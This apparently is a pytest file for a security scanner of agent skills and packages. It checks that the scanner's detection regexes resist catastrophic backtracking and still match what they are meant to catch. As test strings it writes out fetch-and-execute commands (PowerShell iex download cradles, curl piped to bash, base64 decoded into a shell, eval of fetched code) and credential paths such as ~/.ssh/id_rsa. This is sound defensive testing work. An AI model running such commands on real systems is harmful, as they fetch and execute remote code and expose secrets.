"""Regexes that backtracked superlinearly on crafted input (found by fuzzing).

A scanned component chooses its own text, so a pattern that is quadratic (or worse) in the length
of a whitespace run, a name or a dotted chain lets a 2 MiB file hold a scan for hours. Each case
below is the shape that was slow, at 200,000 characters, called the way the scanner calls it; each
took seconds to minutes (or, for the list element, grew exponentially) before the pattern was
bounded. The limit is generous so a busy machine does not make the test flaky.
"""

from __future__ import annotations

import time
from pathlib import Path

import pytest

from skilltotal import collector, file_index, loaded_code, typosquatting
from skilltotal.engine import analyze_directory
from skilltotal.models import Component
from skilltotal.scanners import (
    agent_config,
    exposure,
    mcp,
    mcp_elicitation,
    npm_supply,
    secret_exfil,
    secrets,
    sensitive_paths,
    shell_evasion,
    shell_script,
    skill_fetch_exec,
)

N = 200_000
LIMIT = 2.0

CASES = {
    "secret_exfil._JS_MEMBER_READ": lambda: secret_exfil._JS_MEMBER_READ.match(
        "e" + "\n" * N + ";", 1
    ),
    "secret_exfil._JS_CALLEE (long name)": lambda: secret_exfil._JS_CALLEE.search(
        "a" * N + "!", 0, N + 1
    ),
    "secret_exfil._JS_CALLEE (long blank run)": lambda: secret_exfil._JS_CALLEE.search(
        "a " * (N // 2) + "!", 0, N + 1
    ),
    "agent_config._CALLEE": lambda: agent_config._CALLEE.search("a." * (N // 2) + "!", 0, N + 1),
    "exposure._BIND_KEYWORD": lambda: exposure._BIND_KEYWORD.search("host" * (N // 4) + "_"),
    "npm_supply._SHELL_PUBLISH (blanks)": lambda: list(
        npm_supply._SHELL_PUBLISH.finditer(";" + " " * N + "x")
    ),
    "npm_supply._SHELL_PUBLISH (newlines)": lambda: list(
        npm_supply._SHELL_PUBLISH.finditer("\n" * N + "x")
    ),
    "npm_supply._SHELL_PUBLISH (path)": lambda: list(
        npm_supply._SHELL_PUBLISH.finditer("|" + "a/" * (N // 2) + "x")
    ),
    "sensitive_paths._BARE_LIST_ELEMENT (trailing blanks)": lambda: (
        sensitive_paths._BARE_LIST_ELEMENT.match('"~/.ssh/id_rsa"' + " " * N + "!")
    ),
    "sensitive_paths._BARE_LIST_ELEMENT (numbers)": lambda: (
        sensitive_paths._BARE_LIST_ELEMENT.match("01," * (N // 3) + "x")
    ),
    "sensitive_paths._BARE_REGEX_ELEMENT": lambda: (
        sensitive_paths._BARE_REGEX_ELEMENT.match("/a/" + " " * N + "!")
    ),
    "secrets._TELEMETRY_INGEST_CTX": lambda: secrets._TELEMETRY_INGEST_CTX.search(
        "telemetry" + "a." * (N // 2)
    ),
    "secrets._TELEMETRY_INGEST_CTX (repeated)": lambda: secrets._TELEMETRY_INGEST_CTX.search(
        "telemetry." * (N // 10)
    ),
}


@pytest.mark.parametrize("name", sorted(CASES))
def test_pattern_is_linear_on_crafted_input(name):
    started = time.perf_counter()
    CASES[name]()
    elapsed = time.perf_counter() - started
    assert elapsed < LIMIT, f"{name}: {elapsed:.2f}s on {N:,} characters"


def test_a_name_followed_by_many_blank_lines_does_not_stall_the_scan(tmp_path: Path):
    # The audit's reproduction: a JavaScript environment alias, 40,000 newlines, then a request.
    body = "const e = process.env;\nconst u = e" + "\n" * 40_000 + ";fetch(u);\n"
    (tmp_path / "index.js").write_text(body, encoding="utf-8")
    started = time.perf_counter()
    analyze_directory(tmp_path, Component(name="x", type="local", source=str(tmp_path)))
    assert time.perf_counter() - started < 20


def test_bounded_patterns_still_match_what_they_matched():
    assert secret_exfil._JS_MEMBER_READ.match(" .TOKEN", 0)
    assert secret_exfil._JS_MEMBER_READ.match("?.['TOKEN']", 0)
    assert secret_exfil._JS_MEMBER_READ.match(" [k]", 0)
    assert not secret_exfil._JS_MEMBER_READ.match(".toString()", 0)
    text = "x = JSON.stringify("
    m = secret_exfil._JS_CALLEE.search(text, 0, len(text) - 1)
    assert m and m.group(1) == "stringify"
    text = "fs . writeFileSync ("
    m = agent_config._CALLEE.search(text, 0, len(text) - 1)
    assert m and m.group(1) == "fs . writeFileSync"
    assert exposure._BIND_KEYWORD.search("server_hostname")
    assert not exposure._BIND_KEYWORD.search("port")
    assert npm_supply._SHELL_PUBLISH.search("  npm publish --access public")
    assert npm_supply._SHELL_PUBLISH.search("cd pkg && ./node_modules/.bin/npm publish")
    assert npm_supply._SHELL_PUBLISH.search("if ok; then npm publish; fi")
    for line in ('"~/.ssh/id_rsa",', "['~/.ssh', '~/.aws'],", "0x1f, 012, 7: '~/.ssh/x'",
                 "'~/.ssh/id_rsa'.to_string(),", "('~/.ssh', 1) => deny,"):
        assert sensitive_paths._BARE_LIST_ELEMENT.match(line), line
    assert not sensitive_paths._BARE_LIST_ELEMENT.match('open("~/.ssh/id_rsa")')
    assert sensitive_paths._BARE_REGEX_ELEMENT.match(r"/\.ssh\/id_rsa/i ,")
    assert secrets._TELEMETRY_INGEST_CTX.search("https://x.client-telemetry.example/enqueue")
    assert secrets._TELEMETRY_INGEST_CTX.search("https://telemetry-in.example.test/ingest")


# --- security review, 2026-10-15 ----------------------------------------------------------------
# Each shape took seconds to hours before (the first two were cubic: "iex " + 1,000 spaces took
# 42 s, "@mcp.tool" + 500 blank lines 34 s). Each is called the way the engine calls it.
def _rule_pattern(scanner_name: str, rule_id: str):
    from skilltotal.scanners import SCANNERS

    scanner = next(s for s in SCANNERS if s.name == scanner_name)
    return next(r.pattern for r in scanner.rules if r.id == rule_id)


def _all(pattern, text: str) -> None:
    for _ in pattern.finditer(text):
        pass


REVIEW_CASES = {
    "skill_fetch_exec._FETCH_EXEC (iex + blanks)": lambda: _all(
        skill_fetch_exec._FETCH_EXEC, "iex " + " " * N),
    "skill_fetch_exec._FETCH_EXEC (iex( + blanks)": lambda: _all(
        skill_fetch_exec._FETCH_EXEC, "iex(" + " " * N),
    "mcp._PY_TOOL_DEF (blank lines)": lambda: _all(
        mcp._PY_TOOL_DEF, "@mcp.tool" + "\n " * (N // 2)),
    "mcp._PY_TOOL_DEF (blanks)": lambda: _all(mcp._PY_TOOL_DEF, "@mcp.tool" + " " * N + "x"),
    "shell_script.REMOTE_EXEC (eval + blanks)": lambda: _all(
        shell_script.REMOTE_EXEC, "eval(" + " " * N),
    "shell_script.REMOTE_EXEC (eval await)": lambda: _all(
        shell_script.REMOTE_EXEC, "eval(" + "await " * (N // 6)),
    "shell_evasion._PS_IEX_VAR": lambda: _all(shell_evasion._PS_IEX_VAR, "iex" + " " * N),
    "shell_script.DECODE_EXEC_SH (eval)": lambda: _all(
        shell_script.DECODE_EXEC_SH, "eval " * (N // 5)),
    "shell_script.DECODE_EXEC_SH (base64 -d)": lambda: _all(
        shell_script.DECODE_EXEC_SH, "base64 -d " * (N // 10)),
    "ST-SHELL-PIPE-EXEC (curl)": lambda: _all(
        _rule_pattern("shell_script", "ST-SHELL-PIPE-EXEC"), "curl " * (N // 5)),
    "file_index._prints (blanks)": lambda: file_index._prints("(" + " " * N),
    "file_index._prints (echo)": lambda: file_index._prints("(echo " * (N // 6) + "|"),
    "loaded_code._PY_ENTRY_POINT": lambda: _all(loaded_code._PY_ENTRY_POINT, "a." * (N // 2)),
    "mcp_elicitation._PY_MCP_IMPORT": lambda: mcp_elicitation._PY_MCP_IMPORT.search(
        "\n" * N + "x"),
    "typosquatting._PY_MANIFEST_NAME": lambda: typosquatting._PY_MANIFEST_NAME.search("\n" * N),
    "collector._toml_value": lambda: collector._toml_value("\n" * N + "x", "name"),
    "shell_evasion._without_interpolations": lambda: shell_evasion._without_interpolations(
        "${" * (N // 2)),
}


@pytest.mark.parametrize("name", sorted(REVIEW_CASES))
def test_review_pattern_is_linear_on_crafted_input(name):
    started = time.perf_counter()
    REVIEW_CASES[name]()
    elapsed = time.perf_counter() - started
    assert elapsed < LIMIT, f"{name}: {elapsed:.2f}s on {N:,} characters"


# Bounded gaps (`[^\n]{0,1000}` after a word that can repeat): linear now, but a line that repeats
# the word still costs up to the bound per repetition, so these are held to linear growth (8x the
# input, well under 64x the time) rather than to a time on 200,000 characters.
BOUNDED_CASES = {
    "ST-ARCHIVE-PASSWORD-EXTRACT (unzip)": (
        ("shell_script", "ST-ARCHIVE-PASSWORD-EXTRACT"), "unzip "),
    "ST-SHELL-EVASION (iex)": (("shell_evasion", "ST-SHELL-EVASION"), "iex "),
    "ST-SHELL-EVASION (nohup)": (("shell_evasion", "ST-SHELL-EVASION"), "nohup "),
    "ST-SHELL-EVASION (chmod)": (("shell_evasion", "ST-SHELL-EVASION"), "chmod +x "),
    "ST-SHELL-EVASION (codesign)": (("shell_evasion", "ST-SHELL-EVASION"), "codesign --force "),
    "ST-EXPOSE-DEBUG (.run()": (("exposure", "ST-EXPOSE-DEBUG"), "app.run("),
}


@pytest.mark.parametrize("name", sorted(BOUNDED_CASES))
def test_bounded_review_pattern_grows_linearly(name):
    (scanner_name, rule_id), word = BOUNDED_CASES[name]
    pattern = _rule_pattern(scanner_name, rule_id)

    def took(size: int) -> float:
        text = word * (size // len(word))
        started = time.perf_counter()
        _all(pattern, text)
        return time.perf_counter() - started

    small, large = took(5_000), took(40_000)
    assert large < max(small, 0.005) * 25, f"{name}: {small:.4f}s -> {large:.4f}s"


def test_many_iex_variables_are_looked_up_in_linear_time(tmp_path: Path):
    # Thousands of `iex $name` lines, each name different: the assignment of each was searched
    # for over the whole file.
    from skilltotal.file_index import FileIndex

    (tmp_path / "a.ps1").write_text("".join(f"iex $v{i}\n" for i in range(20_000)),
                                    encoding="utf-8")
    index = FileIndex.build(tmp_path)
    started = time.perf_counter()
    assert shell_evasion._ps_cradle_spans(index.files[0]) == []
    assert time.perf_counter() - started < LIMIT


def test_review_patterns_still_match_what_they_matched():
    fetch = skill_fetch_exec._FETCH_EXEC
    for line in ("iex (iwr https://x.invalid/a.ps1)", "iex(irm https://x.invalid/a)",
                 "iex  ( ( iwr https://x.invalid/a))",
                 "Invoke-Expression (Invoke-RestMethod https://x.invalid/a)",
                 "iex ((New-Object Net.WebClient).DownloadString('https://x.invalid/a'))",
                 "iex (New-Object System.Net.WebClient).DownloadString('https://x.invalid/a')"):
        assert fetch.search(line), line
    # As before: no gap at all, or three parentheses, is not the shape.
    assert not fetch.search("iexiwr https://x.invalid/a")
    assert not fetch.search("iex (((iwr https://x.invalid/a)))")

    tool = mcp._PY_TOOL_DEF
    for text, name in (("@mcp.tool()\ndef run_command(x):", "run_command"),
                       ("@mcp.tool\nasync def fetch_url():", "fetch_url"),
                       ("@server.tool(name='x')  \r\n\n    def g():", "g"),
                       ("@fastmcp.tool(\n    description='d',\n)\ndef h():", "h"),
                       ("@app.tool()\n\n\ndef spaced():", "spaced")):
        m = tool.search(text)
        assert m and m.group(1) == name, text
    assert not tool.search("@mcp.tool() def same_line(): pass")

    remote = shell_script.REMOTE_EXEC
    for line in ("eval(await fetch(u))", "eval( await (await fetch(u)).text())",
                 "eval((await fetch(u)).text)", "eval(fetch (u))"):
        assert remote.search(line), line
    assert shell_evasion._PS_IEX_VAR.search("iex $payload").group(1) == "payload"
    assert shell_evasion._PS_IEX_VAR.search("Invoke-Expression ( $code)").group(1) == "code"

    decode = shell_script.DECODE_EXEC_SH
    for line in ('eval "$(echo aGk= | base64 -d)"', "eval $(base64 --decode < x)",
                 "echo aGk= | base64 -d | bash", "base64 -D x | sudo sh"):
        assert decode.search(line), line
    assert not decode.search("evaluate the base64 -d output")
    assert not decode.search("eval x_base64 -d")

    assert _rule_pattern("shell_script", "ST-SHELL-PIPE-EXEC").search(
        "curl -fsSL https://x.invalid/i.sh | bash")
    assert _rule_pattern("shell_script", "ST-ARCHIVE-PASSWORD-EXTRACT").search(
        "unzip -o x.zip -P secret")
    evasion = _rule_pattern("shell_evasion", "ST-SHELL-EVASION")
    for line in ("iex (New-Object Net.WebClient).DownloadString('u')",
                 "nohup ./run > /dev/null & sh /tmp/x", "chmod +x /tmp/payload",
                 "codesign --force --deep -s - x.app"):
        assert evasion.search(line), line
    assert _rule_pattern("exposure", "ST-EXPOSE-DEBUG").search("app.run(host='0', debug=True)")

    assert file_index._prints("echo ")
    assert file_index._prints("  printf '%s\\n' ")
    assert file_index._prints("foo; (echo ")
    assert file_index._prints("cmd && $(printf ")
    assert not file_index._prints("echo a; curl ")
    assert not file_index._prints("curl ")

    assert loaded_code._PY_ENTRY_POINT.search('tool = "pkg.cli:main"').group(1) == "pkg.cli"
    assert loaded_code._PY_ENTRY_POINT.search("'tool-x'='pkg.cli:main'").group(1) == "pkg.cli"
    assert loaded_code._PY_ENTRY_POINT.search("x=pkg.mod:run").group(1) == "pkg.mod"
    assert mcp_elicitation._PY_MCP_IMPORT.search("\n\n  from mcp.server import x")
    assert typosquatting._PY_MANIFEST_NAME.search('\n\n  name = "pkg"').group(1) == "pkg"
    assert collector._toml_value('\n\n  name = "pkg"', "name") == "pkg"
    assert shell_evasion._without_interpolations("a${x}b${y") == "ab${y"
    # Same line, or the next one after an `=` ending its line (`\s*` crosses the newline).
    assert shell_evasion._download_assigned(
        "$a = 1; irm\n$B = (New-Object Net.WebClient).DownloadString(u)\n$c =\n irm u\n"
        "$d = 2\nirm u") == {"a", "b", "c"}
